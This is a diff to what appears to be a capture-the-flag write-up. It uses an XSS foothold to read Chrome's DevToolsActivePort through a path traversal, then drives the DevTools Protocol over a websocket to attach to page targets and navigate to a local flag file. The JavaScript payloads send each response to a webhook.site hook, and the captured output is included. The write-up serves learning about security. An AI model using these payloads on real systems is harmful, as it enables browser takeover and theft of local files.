@@ -484,7 +484,7 @@ We will first fetch the current `DevToolsActivePort`. This does not breach SOP, 
 (async () => {
 	const hook = 'http://webhook.site/<id>/'
 	const r = await fetch('http://localhost/logs../browser_cache/DevToolsActivePort').then(r => r.text())
-	let [port, path] = r.split('\\n')
+	let [port, path] = r.split('\n')
 	const devTools = `http://localhost:${port}${path}`
 })
 ```
@@ -547,3 +547,105 @@ Running this payload, we receive this back on our hook:
 Excellent! We can communicate with CDP and get back responses.
 
 Sadly, we can not call methods such as `Page.navigate` yet because, as we said, we are not in a page context. Think we are controlling the browser, not a specific page yet.
+
+Looking through the documentation, I found [Target.getTargets](https://chromedevtools.github.io/devtools-protocol/tot/Target/#method-getTargets) which allows us to list targets, like pages, to attach to.
+
+With the `targetId` in hand, I tried to use `Target.attachToTarget` to attach to our target:
+```js
+function exfil(data) {
+	fetch(hook + "message", { method: "POST", body: data });
+}
+
+ws.onopen = () => {
+	ws.send(
+		JSON.stringify({
+			id: 1,
+			method: "Target.getTargets",
+		})
+	);
+};
+
+ws.onmessage = (event) => {
+	let data = JSON.parse(event.data);
+
+	switch (data.id) {
+		case 1:
+			const targetId = data.result.targetInfos[1].targetId;
+			exfil(event.data);
+			ws.send(
+				JSON.stringify({
+					id: 2,
+					method: "Target.attachToTarget",
+					params: { targetId },
+				})
+			);
+			break;
+		case 2:
+			exfil(event.data);
+
+			ws.send(
+				JSON.stringify({
+					id: 3,
+					method: "Page.navigate",
+					params: { url: "file:///root/flag2.txt" },
+				})
+			);
+
+			break;
+		case 3:
+			exfil(event.data);
+			break;
+	}
+};
+```
+
+In the payload, we use a simple `switch` based on the `data.id` to ensure correct handling of each message in the CDP command chain. We also utilize an `exfil` function to help us exfiltrate useful data through our hook. 
+
+Looking at the output back at our hook, we see that the attaching occurred but we still couldn't use `Page.navigate` afterwards. Here are the outputs exfiltrated from each stage:
+```js
+{
+  "id": 1,
+  "result": {
+    "targetInfos": [
+      {
+        "targetId": "EA039F1BA374CAE84859319774D4FF1E",
+        "type": "page",
+        "title": "Test XSS",
+        "url": "http://localhost/?q=<redacted>",
+        "attached": true,
+        "canAccessOpener": false,
+        "browserContextId": "2F0C0E397D2F6D44BAC97F8EB78FEFAF"
+      },
+      {
+        "targetId": "350ECE9E405006B9F766A82EC0822BB5",
+        "type": "page",
+        "title": "about:blank",
+        "url": "about:blank",
+        "attached": true,
+        "canAccessOpener": false,
+        "browserContextId": "2F0C0E397D2F6D44BAC97F8EB78FEFAF"
+      }
+    ]
+  }
+}
+```
+
+```json
+{
+  "id": 2,
+  "result": {
+    "sessionId": "9DEB65C99FD436B634D2A022BC0540FD"
+  }
+}
+```
+
+```json
+{
+  "id": 3,
+  "error": {
+    "code": -32601,
+    "message": "'Page.navigate' wasn't found"
+  }
+}
+```
+
